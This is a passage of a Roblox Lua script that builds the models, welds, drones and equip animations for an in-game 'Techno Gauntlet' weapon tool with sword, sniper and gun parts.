local swld1=weld(sprt1,sprt1,Torso,euler(0,0,1.57)*cf(0,-4,0))
local swld2=weld(sprt2,sprt2,sprt1,euler(0,0,0)*cf(0,-0.4,0))
local swld3=weld(sprt3,sprt3,sprt2,euler(0,0,0)*cf(0,-0.3,0))
local swld4=weld(sprt4,sprt4,sprt3,euler(0,0,0)*cf(0,-0.3,0))
local swld5=weld(sprt5,sprt5,sprt4,euler(0,0,0)*cf(0,-0.15,0))
local swld6=weld(sprt6,sprt6,sprt5,euler(0,0,1.57)*cf(0,-0.2,0))
local swld7=weld(sprt7,sprt7,sprt6,euler(0,0.785,0)*cf(0,0,-0.17))
local swld8=weld(sprt8,sprt8,sprt5,euler(0,0,1.57)*cf(0,-0.4,0))
local swld9=weld(sprt9,sprt9,sprt1,euler(3.14,3.14,0)*cf(0,0.4,0))
local swld10=weld(sprt10,sprt10,sprt9,euler(0,0,0)*cf(0,-0.3,0))
local swld11=weld(sprt11,sprt11,sprt10,euler(0,0,0)*cf(0,-0.3,0))
local swld12=weld(sprt12,sprt12,sprt11,euler(0,0,0)*cf(0,-0.15,0))
local swld13=weld(sprt13,sprt13,sprt12,euler(0,0,1.57)*cf(0,-0.2,0))
local swld14=weld(sprt14,sprt14,sprt13,euler(0,0.785,0)*cf(0,0,-0.17))
local swld15=weld(sprt15,sprt15,sprt12,euler(0,0,1.57)*cf(0,-0.4,0))
local swld16=weld(sprt16,sprt16,sprt1,cf(0,0,-0.3))
local swld17=weld(sprt17,sprt17,sprt1,euler(0.55,0,0)*cf(0,3.7,-0.79))
local swld18=weld(sprt18,sprt18,sprt1,cf(0,0,-0.8))
local swld19=weld(sprt19,sprt19,sprt1,euler(-0.55,0,0)*cf(0,-3.7,-0.79))
table.insert(SwordWelds,swld1)
table.insert(SwordWelds,swld2)
table.insert(SwordWelds,swld3)
table.insert(SwordWelds,swld4)
table.insert(SwordWelds,swld5)
table.insert(SwordWelds,swld6)
table.insert(SwordWelds,swld7)
table.insert(SwordWelds,swld8)
table.insert(SwordWelds,swld9)
table.insert(SwordWelds,swld10)
table.insert(SwordWelds,swld11)
table.insert(SwordWelds,swld12)
table.insert(SwordWelds,swld13)
table.insert(SwordWelds,swld14)
table.insert(SwordWelds,swld15)
table.insert(SwordWelds,swld16)
table.insert(SwordWelds,swld17)
table.insert(SwordWelds,swld18)
table.insert(SwordWelds,swld19)
 
numb=0
numb2=0
bend=0
for i=1,8 do
local sprtblade1=part(3,sword,0.3,0,BrickColor.new("White"),"Partblade1",vt(1,1,1))
smshblade1=mesh("SpecialMesh",sprtblade1,"Wedge","",vt(0,0,0),vt(0.1+numb2,0.7,0.7))
local swldblade1=weld(sprtblade1,sprtblade1,sprt5,euler(0,0,0)*cf(0,-0.3-numb,0.1+bend)*euler(-bend,0,0))
table.insert(SwordWelds,swldblade1)
local sprtblade2=part(3,sword,0.3,0,BrickColor.new("White"),"Partblade2",vt(1,1,1))
smshblade2=mesh("SpecialMesh",sprtblade2,"Wedge","",vt(0,0,0),vt(0.1+numb2,0.7,0.7))
local swldblade2=weld(sprtblade2,sprtblade2,sprt12,euler(0,0,0)*cf(0,-0.3-numb,0.1+bend)*euler(-bend,0,0))
table.insert(SwordWelds,swldblade2)
numb=numb+0.3
numb2=numb2-0.01
bend=bend+0.05
end
 
local sniper=Instance.new("Model") 
sniper.Parent=modelzorz
sniper.Name="Hand Sniper" 
sniper.Parent=nil
 
local snprt1=part(3,sniper,0,0,BrickColor.new("Dark stone grey"),"Part1",vt(1,1,1))
local snprt2=part(3,sniper,0,0,BrickColor.new("Dark stone grey"),"Part2",vt(1,1,1))
local snprt3=part(3,sniper,0,0,BrickColor.new("Dark stone grey"),"Part3",vt(1,1,1))
local snprt4=part(3,sniper,0,0,BrickColor.new("Dark stone grey"),"Part4",vt(1,1,1))
local snprt5=part(3,sniper,0,0,BrickColor.new("Dark stone grey"),"Part5",vt(1,1,1))
local snprt6=part(3,sniper,0,0,BrickColor.new("Dark stone grey"),"Part6",vt(1,1,1))
local snprt7=part(3,sniper,0,0,BrickColor.new("Dark stone grey"),"Part7",vt(1,1,1))
local snprt8=part(3,sniper,0,0,BrickColor.new("Dark stone grey"),"Part8",vt(1,1,1))
local snprt9=part(3,sniper,0,0,BrickColor.new("Dark stone grey"),"Part9",vt(1,1,1))
local snprt10=part(3,sniper,0,0,BrickColor.new("Black"),"Part10",vt(1,1,1))
local snprt11=part(3,sniper,0,0,BrickColor.new("Black"),"Part11",vt(1,1,1))
local snprt12=part(3,sniper,0,0,BrickColor.new("Black"),"Part12",vt(1,1,1))
local snprt13=part(3,sniper,0,0,BrickColor.new("Black"),"Part13",vt(1,1,1))
local snprt14=part(3,sniper,0,0,BrickColor.new("Black"),"Part14",vt(1,1,1))
local snprt15=part(3,sniper,0,0,BrickColor.new("Really black"),"Part15",vt(1,1,1))
local snprt16=part(3,sniper,0,0,BrickColor.new("Black"),"Part16",vt(1,1,1))
local snprt17=part(3,sniper,0,0,BrickColor.new("Black"),"Part17",vt(1,1,1))
local snprt18=part(3,sniper,0,0,BrickColor.new("Black"),"Part18",vt(1,1,1))
local snprt19=part(3,sniper,0,0,BrickColor.new("Black"),"Part19",vt(1,1,1))
local snprt20=part(3,sniper,0,0,BrickColor.new("Black"),"Part20",vt(1,1,1))
local snprt21=part(3,sniper,0,0,BrickColor.new("Black"),"Part21",vt(1,1,1))
local snprt22=part(3,sniper,0,0,BrickColor.new("Black"),"Part22",vt(1,1,1))
local snprt23=part(3,sniper,0,0,BrickColor.new("Dark stone grey"),"Part23",vt(1,1,1))
local snprt24=part(3,sniper,0,0,BrickColor.new("Medium stone grey"),"Part24",vt(1,1,1))
local snprt25=part(3,sniper,0,0,BrickColor.new("Black"),"Part25",vt(1,1,1))
local snprt26=part(3,sniper,0,0,BrickColor.new("Black"),"Part26",vt(1,1,1))
local snprt27=part(3,sniper,0,0,BrickColor.new("Dark stone grey"),"Part27",vt(1,1,1))
local snprt28=part(3,sniper,0,0,BrickColor.new("Black"),"Part28",vt(1,1,1))
local snprt29=part(3,sniper,0,0,BrickColor.new("Black"),"Part29",vt(1,1,1))
 
snmsh1=mesh("BlockMesh",snprt1,"","",vt(0,0,0),vt(0.2,1,0.2))
snmsh2=mesh("BlockMesh",snprt2,"","",vt(0,0,0),vt(0.201,0.5,0.5))
snmsh3=mesh("BlockMesh",snprt3,"","",vt(0,0,0),vt(0.2,0.3,0.3))
snmsh4=mesh("BlockMesh",snprt4,"","",vt(0,0,0),vt(0.199,0.6,0.7))
snmsh5=mesh("BlockMesh",snprt5,"","",vt(0,0,0),vt(0.198,0.9,0.3))
snmsh6=mesh("BlockMesh",snprt6,"","",vt(0,0,0),vt(0.202,3.5,0.3))
snmsh7=mesh("BlockMesh",snprt7,"","",vt(0,0,0),vt(0.1,0.5,0.1))
snmsh8=mesh("BlockMesh",snprt8,"","",vt(0,0,0),vt(0.1,0.6,0.1))
snmsh9=mesh("BlockMesh",snprt9,"","",vt(0,0,0),vt(0.201,1.7,0.2))
snmsh10=mesh("BlockMesh",snprt10,"","",vt(0,0,0),vt(0.15,0.4,0.4))
snmsh11=mesh("BlockMesh",snprt11,"","",vt(0,0,0),vt(0.201,0.8,0.2))
snmsh12=mesh("CylinderMesh",snprt12,"","",vt(0,0,0),vt(0.2,4,0.2))
snmsh13=mesh("CylinderMesh",snprt13,"","",vt(0,0,0),vt(0.4,0.2,0.4))
snmsh14=mesh("CylinderMesh",snprt14,"","",vt(0,0,0),vt(0.22,0.3,0.22))
snmsh15=mesh("CylinderMesh",snprt15,"","",vt(0,0,0),vt(0.15,0.301,0.15))
snmsh16=mesh("BlockMesh",snprt16,"","",vt(0,0,0),vt(0.1,0.7,0.1))
snmsh17=mesh("BlockMesh",snprt17,"","",vt(0,0,0),vt(0.05,0.2,0.1))
snmsh18=mesh("BlockMesh",snprt18,"","",vt(0,0,0),vt(0.05,0.2,0.1))
snmsh19=mesh("BlockMesh",snprt19,"","",vt(0,0,0),vt(0.05,0.2,0.1))
snmsh20=mesh("BlockMesh",snprt20,"","",vt(0,0,0),vt(0.05,0.2,0.1))
snmsh21=mesh("CylinderMesh",snprt21,"","",vt(0,0,0),vt(0.2,0.099,0.2))
snmsh22=mesh("CylinderMesh",snprt22,"","",vt(0,0,0),vt(0.2,0.099,0.2))
snmsh23=mesh("CylinderMesh",snprt23,"","",vt(0,0,0),vt(0.199,1,0.199))
snmsh24=mesh("CylinderMesh",snprt24,"","",vt(0,0,0),vt(0.15,1.01,0.15))
snmsh25=mesh("BlockMesh",snprt25,"","",vt(0,0,0),vt(0.3,0.5,0.2))
snmsh26=mesh("CylinderMesh",snprt26,"","",vt(0,0,0),vt(0.05,0.3,0.05))
snmsh27=mesh("SpecialMesh",snprt27,"Sphere","",vt(0,0,0),vt(0.1,0.1,0.1))
snmsh28=mesh("BlockMesh",snprt28,"","",vt(0,0,0),vt(0.05,0.3,0.05))
snmsh29=mesh("CylinderMesh",snprt29,"","",vt(0,0,0),vt(0.15,0.4,0.15))
 
local SniperWelds={}
local snwld1=weld(snprt1,snprt1,Torso,euler(0.5,0,0)*cf(0,-4,0))
local snwld2=weld(snprt2,snprt2,snprt1,euler(-0.5,0,0)*cf(0,0.5,-0.2))
local snwld3=weld(snprt3,snprt3,snprt2,euler(-0.785,0,0)*cf(0,-0.1,-0.2))
local snwld4=weld(snprt4,snprt4,snprt3,euler(0.785,0,0)*cf(0,-0.4,0))
local snwld5=weld(snprt5,snprt5,snprt4,cf(0,0,-0.3))
local snwld6=weld(snprt6,snprt6,snprt1,euler(1.07,0,0)*cf(0,-0.5,0.2))
local snwld7=weld(snprt7,snprt7,snprt6,euler(0,0,0)*cf(0,0.2,0.5))
local snwld8=weld(snprt8,snprt8,snprt6,euler(1.57,0,0)*cf(0,-0.1,0.25))
local snwld9=weld(snprt9,snprt9,snprt6,euler(0,0,0)*cf(0,-0.9,0.25))
local snwld10=weld(snprt10,snprt10,snprt9,euler(0,0,0)*cf(0,0.5,0.2))
local snwld11=weld(snprt11,snprt11,snprt6,euler(0,0,0)*cf(0,0.2,-0.2))
local snwld12=weld(snprt12,snprt12,snprt11,euler(0,0,0)*cf(0,-2,0))
local snwld13=weld(snprt13,snprt13,snprt12,euler(0,0,0)*cf(0,-1.8,0))
local snwld14=weld(snprt14,snprt14,snprt12,euler(0,0,0)*cf(0,-2,0))
local snwld15=weld(snprt15,snprt15,snprt14,euler(0,0,0)*cf(0,0,0))
local snwld16=weld(snprt16,snprt16,snprt11,euler(0,0,0)*cf(0,0,-0.1))
local snwld17=weld(snprt17,snprt17,snprt16,euler(1.57,0,0)*cf(0.05,0.2,-0.1))
local snwld18=weld(snprt18,snprt18,snprt16,euler(1.57,0,0)*cf(-0.05,0.2,-0.1))
local snwld19=weld(snprt19,snprt19,snprt16,euler(1.57,0,0)*cf(-0.05,-0.2,-0.1))
local snwld20=weld(snprt20,snprt20,snprt16,euler(1.57,0,0)*cf(0.05,-0.2,-0.1))
local snwld21=weld(snprt21,snprt21,snprt16,euler(0,0,0)*cf(0,0.2,-0.2))
local snwld22=weld(snprt22,snprt22,snprt16,euler(0,0,0)*cf(0,-0.2,-0.2))
local snwld23=weld(snprt23,snprt23,snprt16,euler(0,0,0)*cf(0,0,-0.2))
local snwld24=weld(snprt24,snprt24,snprt23,euler(0,0,0)*cf(0,0,0))
local snwld25=weld(snprt25,snprt25,snprt6,euler(0,0,0)*cf(0,-0.5,0))
local snwld26=weld(snprt26,snprt26,snprt25,cf(0,-0.3,0)*euler(0.5,0.7,1.57))
local snwld27=weld(snprt27,snprt27,snprt26,cf(0,-0.1,0))
local snwld28=weld(snprt28,snprt28,snprt6,euler(1.57-0.5,0,0)*cf(0,0.2,0.2))
local snwld29=weld(snprt29,snprt29,snprt9,euler(0,0.2,1.57)*cf(0,-0.8,0.1))
table.insert(SniperWelds,snwld1)
table.insert(SniperWelds,snwld2)
table.insert(SniperWelds,snwld3)
table.insert(SniperWelds,snwld4)
table.insert(SniperWelds,snwld5)
table.insert(SniperWelds,snwld6)
table.insert(SniperWelds,snwld7)
table.insert(SniperWelds,snwld8)
table.insert(SniperWelds,snwld9)
table.insert(SniperWelds,snwld10)
table.insert(SniperWelds,snwld11)
table.insert(SniperWelds,snwld12)
table.insert(SniperWelds,snwld13)
table.insert(SniperWelds,snwld14)
table.insert(SniperWelds,snwld15)
table.insert(SniperWelds,snwld16)
table.insert(SniperWelds,snwld17)
table.insert(SniperWelds,snwld18)
table.insert(SniperWelds,snwld19)
table.insert(SniperWelds,snwld20)
table.insert(SniperWelds,snwld21)
table.insert(SniperWelds,snwld22)
table.insert(SniperWelds,snwld23)
table.insert(SniperWelds,snwld24)
table.insert(SniperWelds,snwld25)
table.insert(SniperWelds,snwld26)
table.insert(SniperWelds,snwld27)
table.insert(SniperWelds,snwld28)
table.insert(SniperWelds,snwld29)
 
numb=-0.15
numb2=0.1
for i=1,2 do
local snprt30=part(3,sniper,0,0,BrickColor.new("Black"),"Part30",vt(1,1,1))
local snprt31=part(3,sniper,0,0,BrickColor.new("Black"),"Part31",vt(1,1,1))
local snprt32=part(3,sniper,0,0,BrickColor.new("Black"),"Part32",vt(1,1,1))
local snprt33=part(3,sniper,0,0,BrickColor.new("Black"),"Part33",vt(1,1,1))
local snprt34=part(3,sniper,0,0,BrickColor.new("Black"),"Part34",vt(1,1,1))
local snprt35=part(3,sniper,0,0,BrickColor.new("Black"),"Part35",vt(1,1,1))
local snprt36=part(3,sniper,0,0,BrickColor.new("Black"),"Part36",vt(1,1,1))
local snprt37=part(3,sniper,0,0,BrickColor.new("Black"),"Part37",vt(1,1,1))
snmsh30=mesh("CylinderMesh",snprt30,"","",vt(0,0,0),vt(0.2,0.1,0.2))
snmsh31=mesh("CylinderMesh",snprt31,"","",vt(0,0,0),vt(0.1,0.5,0.1))
snmsh32=mesh("CylinderMesh",snprt32,"","",vt(0,0,0),vt(0.15,0.1,0.15))
snmsh33=mesh("CylinderMesh",snprt33,"","",vt(0,0,0),vt(0.125,0.3,0.125))
snmsh34=mesh("CylinderMesh",snprt34,"","",vt(0,0,0),vt(0.15,0.2,0.15))
snmsh35=mesh("CylinderMesh",snprt35,"","",vt(0,0,0),vt(0.08,0.8,0.08))
snmsh36=mesh("CylinderMesh",snprt36,"","",vt(0,0,0),vt(0.15,0.2,0.15))
snmsh37=mesh("CylinderMesh",snprt37,"","",vt(0,0,0),vt(0.2,0.1,0.2))
local snwld30=weld(snprt30,snprt30,snprt29,euler(0,0,0)*cf(0,numb,0))
local snwld31=weld(snprt31,snprt31,snprt30,euler(0,0,1.57+numb2)*cf(0.25,0,0))
local snwld32=weld(snprt32,snprt32,snprt31,cf(0,0.25,0))
local snwld33=weld(snprt33,snprt33,snprt32,cf(0,0.15,0))
local snwld34=weld(snprt34,snprt34,snprt33,cf(0,0.1,0))
local snwld35=weld(snprt35,snprt35,snprt34,cf(0,0.4,0))
local snwld36=weld(snprt36,snprt36,snprt35,cf(0,0.4,0))
local snwld37=weld(snprt37,snprt37,snprt36,cf(0,0.1,0))
table.insert(SniperWelds,snwld30)
table.insert(SniperWelds,snwld31)
table.insert(SniperWelds,snwld32)
table.insert(SniperWelds,snwld33)
table.insert(SniperWelds,snwld34)
table.insert(SniperWelds,snwld35)
table.insert(SniperWelds,snwld36)
table.insert(SniperWelds,snwld37)
numb=numb+0.3
numb2=numb2-0.2
end
if (script.Parent.className ~= "HopperBin") then 
Tool = Instance.new("HopperBin") 
Tool.Parent = Backpack 
Tool.Name = "Techno Gauntlet" 
script.Parent = Tool 
end 
Bin = script.Parent 
 
local Bg = it("BodyGyro") 
Bg.maxTorque = Vector3.new(4e+005,4e+005,4e+005)*math.huge 
Bg.P = 20e+003 
Bg.Parent = nil 
 
so = function(id,par,vol,pit) 
coroutine.resume(coroutine.create(function()
local sou = Instance.new("Sound",par or workspace)
sou.Volume=vol
sou.Pitch=pit or 1
sou.SoundId=id
wait() 
sou:play() 
wait(6) 
sou:Remove() 
end))
end
 
function CreateDrone()
local drone=Instance.new("Model")
drone.Parent=modelzorz
drone.Name="Drone"
 
local dprt1=part(3,drone,0,1,BrickColor.new("White"),"DPart1",vt(1,1,1))
dprt1.CanCollide=true
local dprt6=part(3,drone,0,1,BrickColor.new("Bright red"),"DPart6",vt(1,1,1))
local dprt7=part(3,drone,0,1,BrickColor.new("Black"),"DPart7",vt(1,1,1))
 
local dmsh1=mesh("SpecialMesh",dprt1,"Sphere","",vt(0,0,0),vt(1,1,1))
local dmsh6=mesh("CylinderMesh",dprt6,"","",vt(0,0,0),vt(0.5,0.2,0.5))
local dmsh7=mesh("CylinderMesh",dprt7,"","",vt(0,0,0),vt(0.4,0.21,0.4))
 
--local dwld1=weld(dprt1,dprt1,Torso,euler(0,0,0)*cf(0,-5,0))
local dwld6=weld(dprt6,dprt6,dprt1,euler(1.57,0,0)*cf(0,0,0.4))
local dwld7=weld(dprt7,dprt7,dprt6,cf(0,0,0))
 
numb=0
for i=1,4 do
local dprt2=part(3,drone,0,1,BrickColor.new("Medium stone grey"),"DPart2",vt(1,1,1))
local dmsh2=mesh("BlockMesh",dprt2,"","",vt(0,0,0),vt(0.5,0.5,0.8))
local dwld2=weld(dprt2,dprt2,dprt1,cf(0,-0.5,0)*euler(0,0,numb))
numb=numb+1.57
end
numb=0
for i=1,4 do
local dprt3=part(3,drone,0,1,BrickColor.new("Dark stone grey"),"DPart3",vt(1,1,1))
local dmsh3=mesh("BlockMesh",dprt3,"","",vt(0,0,0),vt(0.5,0.5,0.79))
local dwld3=weld(dprt3,dprt3,dprt1,cf(0,-0.3,0)*euler(0,0,0.785+numb))
numb=numb+1.57
end
numb=0
for i=1,4 do
local dprt4=part(3,drone,0,1,BrickColor.new("Dark stone grey"),"DPart4",vt(1,1,1))
local dmsh4=mesh("BlockMesh",dprt4,"","",vt(0,0,0),vt(0.2,0.8,0.2))
local dwld4=weld(dprt4,dprt4,dprt1,cf(0,0.8,0)*euler(0.785,numb,0))
local dprt5=part(3,drone,0,1,BrickColor.new("Bright blue"),"DPart5",vt(1,1,1))
local dmsh5=mesh("SpecialMesh",dprt5,"Sphere","",vt(0,0,0),vt(0.4,0.4,0.4))
local dwld5=weld(dprt5,dprt5,dprt4,cf(0,0.5,0)*euler(0,0,0))
light1=Instance.new("PointLight")
light1.Brightness=.8
light1.Color=Color3.new(0,0,255)
light1.Range=10
light1.Parent=dprt5
numb=numb+1.57
end
return drone,dprt1
end
 
function hideanim() 
equipped=false
if Mode=="Drones" then
Mode="Choose"
end
wait(0.1) 
cone.Parent=nil
screen1.Parent=nil
screen2.Parent=nil
screen3.Parent=nil
Neck.C0=necko*euler(0,0,0)
wld9.C0=euler(0,0,0)*cf(0,0.05,0)
Bg.Parent=nil
end 
 
function equipanim() 
equipped=true
if Mode=="Choose" then
for i=0,1,0.1 do
wait()
Neck.C0=necko*euler(0.3*i,0,-0.2*i)
RW.C0=cf(1.5-0.5*i, 0.5-0.2*i, -0.5*i) * euler(1*i,0,-1*i)
RW.C1=cf(0, 0.5, 0) * euler(0,-2.07*i,0)
LW.C0=cf(-1.5+0.3*i, 0.5, -0.3*i) * euler(1.5*i,0,1.2*i)
LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
for i=0,1,0.1 do
wait()
wld9.C0=euler(0,-1.57*i,0)*cf(0,0.05,0)
Neck.C0=necko*euler(0.3+0.1*i,0,-0.2-0.1*i)
RW.C0=cf(1, 0.3, -0.5) * euler(1-0.2*i,0,-1+0.3*i)
RW.C1=cf(0, 0.5, 0) * euler(0,-2.07-0.1*i,0)
LW.C0=cf(-1.2, 0.5, -0.3) * euler(1.5-0.2*i,0,1.2-0.5*i)
LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
coroutine.resume(coroutine.create(function() 
cone.Parent=modelzorz
cone.Transparency=1
local conewld=weld(cone,cone,prt9,euler(0,0,0)*cf(0,0.2,0))
screen1.Parent=modelzorz
screen1.Transparency=1
local screen1wld=weld(screen1,screen1,cone,euler(0,0.8,0)*cf(0,1,0))
screen2.Parent=modelzorz
screen2.Transparency=1
local screen2wld=weld(screen2,screen2,screen1,cf(0,0,1)*euler(0,0.3,0))
screen3.Parent=modelzorz
screen3.Transparency=1
local screen3wld=weld(screen3,screen3,screen1,cf(0,0,-1)*euler(0,-0.3,0))
 
for i=1,0.5,-0.05 do
wait()
cone.Transparency=i
screen1.Transparency=i
screen2.Transparency=i
screen3.Transparency=i
end
coroutine.resume(coroutine.create(function(Cone,Screen1,Screen2,Screen3) 
while Mode=="Choose" do
wait(0.06)
Cone.Transparency=0.5
Screen1.Transparency=0.5
Screen2.Transparency=0.5
Screen3.Transparency=0.5
light1.Brightness=.7
light2.Brightness=.7
light3.Brightness=.7
wait(0.06)
Cone.Transparency=0.6
Screen1.Transparency=0.6
Screen2.Transparency=0.6
Screen3.Transparency=0.6
light1.Brightness=.8
light2.Brightness=.8
light3.Brightness=.8
end
end),cone,screen1,screen2,screen3)
end))
for i=0,1,0.1 do
wait()
wld9.C0=euler(0,-1.57,0)*cf(0,0.05,0)
Neck.C0=necko*euler(0.4-0.7*i,0,-0.3)
RW.C0=cf(1, 0.3, -0.5-0.3*i) * euler(0.8+0.77*i,0,-1+0.3)
RW.C1=cf(0, 0.5, 0) * euler(0,-2.17+0.67*i,0)
LW.C0=cf(-1.2, 0.5, -0.3) * euler(1.3+1*i,0,0.7)
LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
Neck.C0=necko*euler(-0.3,0,-0.3)
RW.C0=cf(1, 0.3, -0.8) * euler(1.57,0,-0.7)
RW.C1=cf(0, 0.5, 0) * euler(0,-1.5,0)
LW.C0=cf(-1.2, 0.5, -0.3) * euler(2.3,0,0.7)
LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
end 
 
function Drones()
Mode="Drones"
attack=true
Humanoid.WalkSpeed=0
coroutine.resume(coroutine.create(function() 
while Mode=="Drones" do
wait()
if Aiming==false then
DroneTarget=Torso.Position
end
end
end))
coroutine.resume(coroutine.create(function(Cone,Screen1,Screen2,Screen3) 
numb=0.5
for i=0,1,0.1 do
wait()
Cone.Transparency=numb
Screen1.Transparency=numb
Screen2.Transparency=numb
Screen3.Transparency=numb
numb=numb+0.1
end
Cone.Parent=nil
Screen1.Parent=nil
Screen2.Parent=nil
Screen3.Parent=nil
end),cone,screen1,screen2,screen3)
for i=0,1,0.1 do
wait()
Neck.C0=necko*euler(-0.3+0.3*i,0,-0.3+0.3*i)
RW.C0=cf(1, 0.3, -0.8) * euler(1.57-0.3*i,0,-0.7-0.6*i)
RW.C1=cf(0, 0.5, 0) * euler(0,-1.5+0.5*i,0)
LW.C0=cf(-1.2, 0.5, -0.3) * euler(2.3-0.8*i,0,0.7-0.5*i)
LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
local drone1,droneprt1=CreateDrone()
local dwld1=weld(droneprt1,droneprt1,Torso,euler(0,0,0)*cf(2,0,5))
local drone2,droneprt2=CreateDrone()
local dwld12=weld(droneprt2,droneprt2,Torso,euler(0,0,0)*cf(0,0,5))
local drone3,droneprt3=CreateDrone()
local dwld13=weld(droneprt3,droneprt3,Torso,euler(0,0,0)*cf(-2,0,5))
wait()
dwld1:Remove()
dwld12:Remove()
dwld13:Remove()
local pos=it("BodyPosition",droneprt1)
rand1=math.random(-5,5)
rand2=math.random(-5,5)
pos.position=Torso.Position + vt(rand1,5,rand2)
coroutine.resume(coroutine.create(function(BodyPosition) 
while droneprt1.Parent~=nil do
wait(math.random(1,3))
BodyPosition.position=Torso.Position + vt(math.random(-15,15),5,math.random(-15,15))
end
end),pos)
pos.maxForce=vt(7500,7500,7500)
pos.Name="BP"
local bg=it("BodyGyro",droneprt1)
bg.maxTorque=vt(math.huge,math.huge,math.huge)
bg.P=50000
--bg.cframe=cf(droneprt1.Position, Torso.Position)
coroutine.resume(coroutine.create(function(BodyGyro) 
while droneprt1.Parent~=nil do
wait()
if Aiming==true then
BodyGyro.cframe=cf(droneprt1.Position, DroneTarget)
end
end
end),bg)
bg.Name="DroneGyro"
local pos=it("BodyPosition",droneprt2)
rand1=math.random(-5,5)
rand2=math.random(-5,5)
pos.position=Torso.Position + vt(rand1,5,rand2)
coroutine.resume(coroutine.create(function(BodyPosition) 
while droneprt2.Parent~=nil do
wait(math.random(1,3))
BodyPosition.position=Torso.Position + vt(math.random(-15,15),5,math.random(-15,15))
end
end),pos)
pos.maxForce=vt(7500,7500,7500)
pos.Name="BP"
local bg=it("BodyGyro",droneprt2)
bg.maxTorque=vt(math.huge,math.huge,math.huge)
bg.P=50000
--bg.cframe=cf(droneprt1.Position, Torso.Position)
coroutine.resume(coroutine.create(function(BodyGyro) 
while droneprt2.Parent~=nil do
wait()
if Aiming==true then
BodyGyro.cframe=cf(droneprt2.Position, DroneTarget)
end
end
end),bg)
bg.Name="DroneGyro"
local pos=it("BodyPosition",droneprt3)
rand1=math.random(-5,5)
rand2=math.random(-5,5)
pos.position=Torso.Position + vt(rand1,5,rand2)
coroutine.resume(coroutine.create(function(BodyPosition) 
while droneprt3.Parent~=nil do
wait(math.random(1,3))
BodyPosition.position=Torso.Position + vt(math.random(-15,15),5,math.random(-15,15))
end
end),pos)
pos.maxForce=vt(7500,7500,7500)
pos.Name="BP"
local bg=it("BodyGyro",droneprt3)
bg.maxTorque=vt(math.huge,math.huge,math.huge)
bg.P=50000
--bg.cframe=cf(droneprt1.Position, Torso.Position)
coroutine.resume(coroutine.create(function(BodyGyro) 
while droneprt3.Parent~=nil do
wait()
if Aiming==true then
BodyGyro.cframe=cf(droneprt3.Position, DroneTarget)
end
end
end),bg)
bg.Name="DroneGyro"
droneprt1.Anchored=true
for _,v in pairs(drone1:children()) do
if v.className=="Part" then
v.Transparency=1
coroutine.resume(coroutine.create(function(Part) 
wait(1)
Part.Transparency=0
end),v)
end
end
effect=drone1:Clone()
effect.Parent=workspace
print(effect)
for _,v in pairs(effect:children()) do
if v.className=="Part" then
v.Transparency=1
v.Anchored=true
v.CanCollide=false
v.BrickColor=BrickColor.new("Bright blue")
coroutine.resume(coroutine.create(function(Part) 
for i=0,1,0.1 do
wait(0)
Part.Transparency=Part.Transparency-0.05
end
wait(0.5)
for i=0,1,0.1 do
wait(0)
Part.Transparency=Part.Transparency+0.05
end
Part.Parent=nil
end),v)
end
end
droneprt2.Anchored=true
for _,v in pairs(drone2:children()) do
if v.className=="Part" then
v.Transparency=1
coroutine.resume(coroutine.create(function(Part) 
wait(1)
Part.Transparency=0
end),v)
end
end
effect=drone2:Clone()
effect.Parent=workspace
print(effect)
for _,v in pairs(effect:children()) do
if v.className=="Part" then
v.Transparency=1
v.Anchored=true
v.CanCollide=false
v.BrickColor=BrickColor.new("Bright blue")
coroutine.resume(coroutine.create(function(Part) 
for i=0,1,0.1 do
wait(0)
Part.Transparency=Part.Transparency-0.05
end
wait(0.5)
for i=0,1,0.1 do
wait(0)
Part.Transparency=Part.Transparency+0.05
end
Part.Parent=nil
end),v)
end
end
droneprt3.Anchored=true
for _,v in pairs(drone3:children()) do
if v.className=="Part" then
v.Transparency=1
coroutine.resume(coroutine.create(function(Part) 
wait(1)
Part.Transparency=0
end),v)
end
end
effect=drone3:Clone()
effect.Parent=workspace
print(effect)
for _,v in pairs(effect:children()) do
if v.className=="Part" then
v.Transparency=1
v.Anchored=true
v.CanCollide=false
v.BrickColor=BrickColor.new("Bright blue")
coroutine.resume(coroutine.create(function(Part) 
for i=0,1,0.1 do
wait(0)
Part.Transparency=Part.Transparency-0.05
end
wait(0.5)
for i=0,1,0.1 do
wait(0)
Part.Transparency=Part.Transparency+0.05
end
Part.Parent=nil
end),v)
end
end
wait(2)
droneprt1.Anchored=false
droneprt2.Anchored=false
droneprt3.Anchored=false
Humanoid.WalkSpeed=16
wait()
effect.Parent=nil
for i=0,1,0.1 do
wait()
RW.C0=cf(1+0.5*i, 0.3+0.2*i, -0.8+0.8*i) * euler(1.27-0.77*i,0,-1.3+1.3*i)
RW.C1=cf(0, 0.5, 0) * euler(0,-1+1*i,0)
LW.C0=cf(-1.2-0.3*i, 0.5, -0.3+0.3*i) * euler(1.5-1.5*i,0,0.2-0.4*i)
LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
attack=false
return drone1, drone2, drone3
end
 
function Gun()
attack=true
Mode="Gun"
gwld1.Part1=LeftArm
gwld1.C0=euler(1.57+0.5,0,-1.57)*cf(0,1,0)
coroutine.resume(coroutine.create(function(Cone,Screen1,Screen2,Screen3) 
numb=0.5
for i=0,1,0.1 do
wait()
Cone.Transparency=numb
Screen1.Transparency=numb
Screen2.Transparency=numb
Screen3.Transparency=numb
numb=numb+0.1
end
Cone.Parent=nil
Screen1.Parent=nil
Screen2.Parent=nil
Screen3.Parent=nil
end),cone,screen1,screen2,screen3)
for i=0,1,0.1 do
wait()
Neck.C0=necko*euler(-0.3+0.3*i,0,-0.3+0.3*i)
RW.C0=cf(1, 0.3, -0.8) * euler(1.57-0.3*i,0,-0.7-0.6*i)
RW.C1=cf(0, 0.5, 0) * euler(0,-1.5+0.5*i,0)
LW.C0=cf(-1.2, 0.5, -0.3) * euler(2.3-0.8*i,0,0.7-0.5*i)
LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
gun.Parent=modelzorz
for e=1,#GunWelds do
GunWelds[e].Parent=modelzorz
end
for _,v in pairs(gun:children()) do
if v.className=="Part" then
v.Transparency=1
end
end
for _,v in pairs(gun:children()) do
if v.className=="Part" then
v.Transparency=1
coroutine.resume(coroutine.create(function(Part) 
wait(0.5)
Part.Transparency=0
end),v)
end
end
effect=gun:Clone()
effect.Parent=workspace
print(effect)
for _,v in pairs(effect:children()) do
